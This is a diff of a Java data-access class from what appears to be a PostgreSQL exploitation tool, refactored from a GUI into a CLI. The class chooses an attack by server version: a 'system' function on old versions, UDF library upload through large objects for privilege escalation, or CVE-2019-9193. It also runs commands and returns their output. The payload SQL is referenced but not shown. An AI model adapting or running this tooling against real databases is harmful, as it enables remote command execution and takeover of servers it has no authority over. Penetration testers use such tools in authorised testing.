@@ -1,25 +1,22 @@
 package Dao;
 
-import Controller.PostgreSqlController;
-import Entity.ControllersFactory;
-import Util.MessageUtil;
+import Util.DriverLoader;
+import Util.JdbcProfiles;
 import Util.PostgreSqlUtil;
+import Util.Reporter;
 import Util.Utils;
-import Util.YamlConfigs;
-import javafx.application.Platform;
 
 import java.io.File;
-import java.lang.reflect.Method;
-import java.net.URL;
-import java.net.URLClassLoader;
 import java.sql.*;
 import java.text.MessageFormat;
 import java.util.Arrays;
 import java.util.List;
-import java.util.Map;
+import java.util.Properties;
 
 /**
  * @author ch1ng & j1anFen
+ * CLI 化解耦（M1）：仅换输出口——Controller/TextArea → Reporter；config.yaml → JdbcProfiles；
+ * DriverManager+addURL → DriverLoader。业务逻辑（SQL 模板/UDF 链/CVE-2019-9193）零改动。
  */
 public class PostgreSqlDao {
     private String JARFILE;
@@ -29,8 +26,6 @@ public class PostgreSqlDao {
     private String PASSWORD;
 
     private Connection CONN = null;
-    private URLClassLoader URLCLASSLOADER = null;
-    private Method METHOD = null;
 
     private Double versionNumber = null;
     private String systemplatform = "";
@@ -40,29 +35,32 @@ public class PostgreSqlDao {
     private String pluginFile = "";
 
     /**
-     * 用此方法获取 PostgreSqlController 的日志框
+     * 统一输出口（原 PostgreSqlController 日志框；缺省空实现，宿主经 setReporter 注入）
      */
-    private PostgreSqlController postgreSqlController = (PostgreSqlController) ControllersFactory.controllers.get(PostgreSqlController.class.getSimpleName());
+    private Reporter reporter = Reporter.NONE;
+
+    public void setReporter(Reporter reporter) {
+        this.reporter = reporter;
+    }
 
     public PostgreSqlDao(String ip, String port, String database, String username, String password, String timeout) throws Exception {
-        // 从配置文件读取变量
-        YamlConfigs configs = new YamlConfigs();
-        Map<String, Object> yamlToMap = configs.getYamlToMap("config.yaml");
-        JARFILE = (String) configs.getValue("PostgreSql.Driver", yamlToMap);
-        JDBCURL = (String) configs.getValue("PostgreSql.JDBCUrl", yamlToMap);
-        DRIVER = (String) configs.getValue("PostgreSql.ClassName", yamlToMap);
-        //JDBCURL = JDBCURL + "?loginTimeout=" + timeout + "&socketTimeout=" + timeout;
+        // 零配置：驱动与 URL 模板取自 JdbcProfiles（原 config.yaml 的 PostgreSql.* 三项）
+        JARFILE = JdbcProfiles.driverPath(JdbcProfiles.POSTGRESQL_JAR);
+        JDBCURL = JdbcProfiles.POSTGRESQL_URL;
+        DRIVER = JdbcProfiles.POSTGRESQL_CLASS;
         JDBCURL = MessageFormat.format(JDBCURL, ip, port, database, timeout);
         USERNAME = username;
         PASSWORD = password;
-        // 动态加载
-        URLCLASSLOADER = (URLClassLoader) ClassLoader.getSystemClassLoader();
-        METHOD = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
-        METHOD.setAccessible(true);
-        // 将路径转为 url 类型进行加载，修复系统路径不兼容问题
-        URL url = (new File(JARFILE)).toURI().toURL();
-        METHOD.invoke(URLCLASSLOADER, url);
-        Class.forName(DRIVER);
+    }
+
+    /**
+     * 连接属性（user/password）
+     */
+    private Properties connectProps() {
+        Properties props = new Properties();
+        props.setProperty("user", USERNAME);
+        props.setProperty("password", PASSWORD);
+        return props;
     }
 
     /**
@@ -71,18 +69,16 @@ public class PostgreSqlDao {
      * @return
      * @throws SQLException
      */
-    public void testConnection() throws SQLException {
+    public void testConnection() throws Exception {
         if (CONN == null || CONN.isClosed()) {
-            Utils.regroupDrivers("ostgresql");
-            DriverManager.getConnection(JDBCURL, USERNAME, PASSWORD);
+            CONN = DriverLoader.connect(JARFILE, DRIVER, JDBCURL, connectProps());
             closeConnection();
         }
     }
 
-    public Connection getConnection() throws SQLException {
+    public Connection getConnection() throws Exception {
         if (CONN == null || CONN.isClosed()) {
-            Utils.regroupDrivers("ostgresql");
-            CONN = DriverManager.getConnection(JDBCURL, USERNAME, PASSWORD);
+            CONN = DriverLoader.connect(JARFILE, DRIVER, JDBCURL, connectProps());
         }
         return CONN;
     }
@@ -104,20 +100,14 @@ public class PostgreSqlDao {
                     String libSql = MessageFormat.format(PostgreSqlUtil.libSql, libFile);
                     PreparedStatement st = CONN.prepareStatement(libSql);
                     st.executeQuery();
-                    Platform.runLater(() -> {
-                        postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("版本 <=8.2 创建 system 函数成功," +
-                                "使用 copy 获取回显,无法回显请 OOB"));
-                    });
+                    reporter.log(Utils.log("版本 <=8.2 创建 system 函数成功," +
+                            "使用 copy 获取回显,无法回显请 OOB"));
                 } catch (Exception e) {
-                    Platform.runLater(() -> {
-                        MessageUtil.showExceptionMessage(e, e.getMessage());
-                    });
+                    reporter.error(e.getMessage(), e);
                 }
             }
         } catch (Exception e) {
-            Platform.runLater(() -> {
-                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log(e.getMessage()));
-            });
+            reporter.log(Utils.log(e.getMessage()));
         }
     }
 
@@ -139,9 +129,7 @@ public class PostgreSqlDao {
             }
 
         } catch (Exception e) {
-            Platform.runLater(() -> {
-                MessageUtil.showExceptionMessage(e, e.getMessage());
-            });
+            reporter.error(e.getMessage(), e);
         }
     }
 
@@ -175,13 +163,11 @@ public class PostgreSqlDao {
             String sqlUnlink = String.format(PostgreSqlUtil.lounlinkSql, randomPIN);
             PreparedStatement st3 = CONN.prepareStatement(sqlUnlink);
             st3.execute();
-            postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("UDF 库写入成功,请尝试执行系统命令"));
+            reporter.log(Utils.log("UDF 库写入成功,请尝试执行系统命令"));
         } catch (Exception e) {
-            Platform.runLater(() -> {
-                MessageUtil.showExceptionMessage(e, e.getMessage());
-            });
-
+            reporter.error(e.getMessage(), e);
         }
+
     }
 
     public String LowVersionEval(String command, String code) throws SQLException {
@@ -213,9 +199,7 @@ public class PostgreSqlDao {
             return resultStr.toString();
 
         } catch (Exception e) {
-            Platform.runLater(() -> {
-                MessageUtil.showExceptionMessage(e, e.getMessage());
-            });
+            reporter.error(e.getMessage(), e);
         } finally {
             String tmp1Sql = PostgreSqlUtil.dropTempTableSql;
             PreparedStatement st4 = CONN.prepareStatement(tmp1Sql);
@@ -233,9 +217,7 @@ public class PostgreSqlDao {
                 return new String(rs.getBytes(1), code);
             }
         } catch (Exception e) {
-            Platform.runLater(() -> {
-                MessageUtil.showExceptionMessage(e, e.getMessage());
-            });
+            reporter.error(e.getMessage(), e);
         }
         return "";
     }
@@ -275,9 +257,7 @@ public class PostgreSqlDao {
             return resultStr.toString();
 
         } catch (Exception e) {
-            Platform.runLater(() -> {
-                MessageUtil.showExceptionMessage(e, e.getMessage());
-            });
+            reporter.error(e.getMessage(), e);
         }
         return null;
     }
@@ -303,13 +283,9 @@ public class PostgreSqlDao {
             PreparedStatement st = CONN.prepareStatement(sql);
             ResultSet rs = st.executeQuery();
 
-            Platform.runLater(() -> {
-                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("清除函数"));
-            });
+            reporter.log(Utils.log("清除函数"));
         } catch (Exception e) {
-            Platform.runLater(() -> {
-                MessageUtil.showExceptionMessage(e, e.getMessage());
-            });
+            reporter.error(e.getMessage(), e);
         }
 
     }
@@ -345,10 +321,8 @@ public class PostgreSqlDao {
                     systemVersionNum = "64";
                 }
 
-                Platform.runLater(() -> {
-                    postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log(String.format("预判服务器类型：%s 服务器版本: %s", systemplatform, systemVersionNum)));
-                    postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log(String.format("PostgreSql 版本：%s", version)));
-                });
+                reporter.log(Utils.log(String.format("预判服务器类型：%s 服务器版本: %s", systemplatform, systemVersionNum)));
+                reporter.log(Utils.log(String.format("PostgreSql 版本：%s", version)));
 
             }
 
@@ -378,31 +352,42 @@ public class PostgreSqlDao {
 
             if (versionNumber <= 8.2) {
                 evalType = "low";
-                Platform.runLater(() -> {
-                    postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("版本小于 8.2 可直接创建 system 函数"));
-                });
+                reporter.log(Utils.log("版本小于 8.2 可直接创建 system 函数"));
             } else if (versionNumber > 8.2 && versionNumber < 9.3) {
                 evalType = "udf";
                 // 设置本地文件目录
                 String path = Utils.getSelfPath() + File.separator + "Plugins" + File.separator + "PostgreSql" + File.separator + versionNumber.toString() + "_" + systemplatform + "_" + systemVersionNum + "_hex.txt";
                 pluginFile = Utils.readFile(path).replace("\n", "");
-                Platform.runLater(() -> {
-                    postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("版本可以尝试进行 UDF 提权"));
-                });
+                reporter.log(Utils.log("版本可以尝试进行 UDF 提权"));
             } else if (versionNumber >= 9.3) {
                 evalType = "cve";
-                Platform.runLater(() -> {
-                    postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("9.3 以上版本默认使用 CVE-2019-9193"));
-                });
+                reporter.log(Utils.log("9.3 以上版本默认使用 CVE-2019-9193"));
             } else {
-                Platform.runLater(() -> {
-                    postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("该版本尚未编译UDF或无法提权"));
-                });
+                reporter.log(Utils.log("该版本尚未编译UDF或无法提权"));
             }
         } catch (Exception e) {
-            Platform.runLater(() -> {
-                MessageUtil.showExceptionMessage(e, e.getMessage());
-            });
+            reporter.error(e.getMessage(), e);
         }
+    }
+
+    // ---- 只读状态访问器（CLI dispatcher 结构化 info / 选路用；不影响既有行为） ----
+    public String getEvalType() {
+        return evalType;
+    }
+
+    public Double getVersionNumber() {
+        return versionNumber;
+    }
+
+    public String getSystemplatform() {
+        return systemplatform;
+    }
+
+    public String getSystemVersionNum() {
+        return systemVersionNum;
+    }
+
+    public String getSystemTempPath() {
+        return systemTempPath;
     }
 }
